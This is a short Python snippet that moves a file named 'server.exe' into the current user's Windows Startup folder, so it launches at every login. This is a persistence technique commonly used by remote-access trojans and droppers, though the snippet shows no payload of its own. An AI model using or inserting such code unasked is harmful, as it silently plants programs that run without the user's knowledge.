import shutil
import getpass
USER_NAME = getpass.getuser()
shutil.move('server.exe', r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'%USER_NAME)
